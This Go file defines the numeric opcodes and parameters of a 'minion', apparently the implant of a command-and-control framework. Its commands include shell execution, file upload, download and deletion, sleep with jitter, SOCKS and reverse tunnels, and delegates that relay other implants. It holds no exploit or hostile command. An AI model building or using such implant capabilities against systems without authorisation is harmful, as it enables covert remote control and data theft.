package main

// The numbers BOB's build schema gives its commands (op) and their params
// (num): a task names its command and args by them (docs:
// contracts/minion-build/, Commands), so the minion carries no command
// names. cmd/bob-factory/build.go declares the same numbers, and a test
// there checks it against this file.
const (
	opSleep          = 1
	opExit           = 2
	opHello          = 3
	opLs             = 4
	opDownload       = 5
	opStreamDownload = 6
	opUpload         = 7
	opStreamUpload   = 8
	opRm             = 9
	opWalk           = 10
	opShell          = 11
	opSwitch         = 12
	opVolumes        = 13
	opFeedback       = 14
	// opTunnel: core opens streams through the minion's host (its front,
	// SOCKS, HTTP or a forward, is core's alone). 16 was a port forward's
	// before the fronts were core's: never used again.
	opTunnel = 15
	// opReverseTunnel listens on the minion's host: its streams are the
	// minion's.
	opReverseTunnel = 17
	// opDelegate makes the minion a delegate (delegate.go): it dials the
	// minions of targets that name its session, for core.
	opDelegate = 18
	// opReverseDelegate makes it a delegate the other way: it listens, and
	// carries the minions that dial it (delegate_reverse.go).
	opReverseDelegate = 19
)

// Params, by command.
const (
	sleepInterval = 1
	sleepJitter   = 2

	lsPath = 1

	downloadPath = 1

	streamDownloadPath = 1

	uploadArgFile      = 1
	uploadArgPath      = 2
	uploadArgOverwrite = 3

	streamUploadStream    = 1
	streamUploadPath      = 2
	streamUploadOverwrite = 3

	rmPath      = 1
	rmRecursive = 2

	walkPath       = 1
	walkDepth      = 2
	walkMaxFolders = 3
	walkHidden     = 4
	walkOneFS      = 5

	shellCommand = 1
	shellTimeout = 2

	switchConn = 1
	switchFor  = 2

	feedbackLevel   = 1
	feedbackMessage = 2

	// A tunnel's front, port and destination are core's: each stream's
	// tunnel item names where it goes.
	tunnelTimeout    = 2
	tunnelMaxStreams = 3

	// A reverse tunnel's bind and listen are the minion's: where it
	// listens. Its front and destination are core's alone: those params
	// carry no num, and never come.
	reverseTunnelBind       = 1
	reverseTunnelListen     = 2
	reverseTunnelTimeout    = 3
	reverseTunnelMaxStreams = 4
	// reverseTunnelUDP: listen for datagrams, a stream for each address
	// they come from.
	reverseTunnelUDP = 5
)

// A reverse delegate's params.
const (
	reverseDelegateBind           = 1
	reverseDelegateListen         = 2
	reverseDelegateKind           = 3
	reverseDelegateMaxConnections = 4
)
